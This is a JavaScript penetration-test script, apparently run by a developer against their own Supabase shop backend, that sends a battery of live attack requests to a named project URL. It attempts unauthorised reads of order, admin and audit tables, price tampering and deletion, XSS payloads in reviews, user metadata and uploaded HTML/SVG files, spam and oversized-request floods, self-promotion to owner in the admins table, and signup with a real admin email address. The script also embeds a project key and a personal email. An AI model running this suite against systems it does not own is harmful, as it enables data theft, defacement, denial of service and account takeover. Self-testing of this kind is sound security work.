// Angriffstest gegen das eigene Supabase-Projekt (anon key = öffentlich, wie ein Angreifer ihn aus dem Quelltext holt)
const U='https://jthmekehipiolsxtjavb.supabase.co',K='sb_publishable__YUQh9Vgtda2nPwyxn-hTw_oMXZDe5-';
const H=(t,x={})=>({apikey:K,...(t?{Authorization:'Bearer '+t}:{}),'Content-Type':'application/json',Prefer:'return=representation',...x});
const out=[];const T=async(n,f)=>{try{const r=await f();out.push([n,r])}catch(e){out.push([n,'ERR '+e.message])}};
const rq=async(m,p,b,t)=>{const r=await fetch(U+'/rest/v1/'+p,{method:m,headers:H(t),body:b?JSON.stringify(b):undefined});const x=await r.text();return r.status+' '+x.slice(0,100)};
(async()=>{
await T('anon read products',()=>rq('GET','products?select=id&limit=1'));
await T('anon INSERT product',()=>rq('POST','products',{name:'HACK',preis:1}));
await T('anon UPDATE product price',()=>rq('PATCH','products?id=eq.1',{preis:1}));
await T('anon DELETE product',()=>rq('DELETE','products?id=eq.1'));
await T('anon read orders',()=>rq('GET','orders?select=*'));
await T('anon read admins',()=>rq('GET','admins?select=*'));
await T('anon read audit_log',()=>rq('GET','audit_log?select=*'));
await T('anon read samples',()=>rq('GET','samples?select=*'));
await T('anon read termine',()=>rq('GET','termine?select=*'));
await T('anon read neubezug',()=>rq('GET','neubezug?select=*'));
await T('anon read visits',()=>rq('GET','visits?select=*&limit=1'));
await T('anon update settings',()=>rq('PATCH','settings?id=eq.1',{hero:{titel:'HACKED'}}));
await T('anon insert order',()=>rq('POST','orders',{id:'HACK',name:'x',items:[],total:1}));
await T('anon insert review',()=>rq('POST','reviews',{product_id:1,name:'x',sterne:5,text:'<img src=x onerror=alert(1)>'}));
await T('anon SPAM termine x30',async()=>{let ok=0;for(let i=0;i<30;i++){const r=await fetch(U+'/rest/v1/termine',{method:'POST',headers:H(),body:JSON.stringify({name:'spam'+i,telefon:'1',nachricht:'x'.repeat(5000)})});if(r.status<300)ok++}return 'accepted '+ok+'/30'});
await T('anon huge visits',async()=>{let ok=0;for(let i=0;i<20;i++){const r=await fetch(U+'/rest/v1/visits',{method:'POST',headers:H(),body:JSON.stringify({path:'x'.repeat(100000)})});if(r.status<300)ok++}return 'accepted '+ok+'/20'});
// storage
await T('anon upload photos',async()=>{const r=await fetch(U+'/storage/v1/object/photos/hack.txt',{method:'POST',headers:{apikey:K,'Content-Type':'text/plain'},body:'x'});return r.status+' '+(await r.text()).slice(0,80)});
await T('anon upload anfragen html',async()=>{const r=await fetch(U+'/storage/v1/object/anfragen/hack.html',{method:'POST',headers:{apikey:K,'Content-Type':'text/html'},body:'<script>alert(1)</script>'});return r.status+' '+(await r.text()).slice(0,80)});
await T('anon upload anfragen svg(js)',async()=>{const r=await fetch(U+'/storage/v1/object/anfragen/hack.svg',{method:'POST',headers:{apikey:K,'Content-Type':'image/svg+xml'},body:'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>'});return r.status+' '+(await r.text()).slice(0,80)});
await T('anon list photos',async()=>{const r=await fetch(U+'/storage/v1/object/list/anfragen',{method:'POST',headers:H(),body:JSON.stringify({prefix:'',limit:5})});return r.status+' '+(await r.text()).slice(0,120)});
// auth as normal user
const email='atk'+Date.now()+'@test.de';
const su=await (await fetch(U+'/auth/v1/signup',{method:'POST',headers:{apikey:K,'Content-Type':'application/json'},body:JSON.stringify({email,password:'abcdef12'})})).json();const tok=su.access_token;
out.push(['signup w/o confirmation → session', tok?'YES (auto-confirmed)':'no']);
await T('user insert order own status=4,total=1',()=>rq('POST','orders',{id:'ATK1',name:'x',email,items:[{n:'x',q:1,pr:1}],total:1,status:4,tracking:'FAKE'},tok));
await T('user read all orders',()=>rq('GET','orders?select=id',null,tok));
await T('user update order status',()=>rq('PATCH','orders?id=eq.ATK1',{status:4},tok));
await T('user insert product',()=>rq('POST','products',{name:'H',preis:1},tok));
await T('user self-add admin',()=>rq('POST','admins',{email,role:'owner'},tok));
await T('user is_admin rpc',async()=>{const r=await fetch(U+'/rest/v1/rpc/is_admin',{method:'POST',headers:H(tok),body:'{}'});return r.status+' '+(await r.text())});
await T('user read audit',()=>rq('GET','audit_log?select=*',null,tok));
await T('user update settings',()=>rq('PATCH','settings?id=eq.1',{hero:{titel:'HACK'}},tok));
await T('user edit own review XSS name',()=>rq('POST','reviews',{product_id:1,name:'<script>alert(1)</script>',sterne:5,text:'x'},tok));
await T('user metadata name xss',async()=>{const r=await fetch(U+'/auth/v1/user',{method:'PUT',headers:{apikey:K,Authorization:'Bearer '+tok,'Content-Type':'application/json'},body:JSON.stringify({data:{name:'<img src=x onerror=alert(1)>'}})});return r.status});
await T('register with admin email (kleinenzaigen)',async()=>{const r=await fetch(U+'/auth/v1/signup',{method:'POST',headers:{apikey:K,'Content-Type':'application/json'},body:JSON.stringify({email:'kleinenzaigen123@gmail.com',password:'abcdef12'})});return r.status+' '+(await r.text()).slice(0,90)});
await T('register unregistered future-admin email',async()=>{const e2='boss'+Date.now()+'@x.de';const r=await fetch(U+'/auth/v1/signup',{method:'POST',headers:{apikey:K,'Content-Type':'application/json'},body:JSON.stringify({email:e2,password:'abcdef12'})});return 'signup status '+r.status+' (if admins table lists this email later, attacker owns it)'});
for(const [n,v] of out)console.log(n.padEnd(46),'=>',v)})()
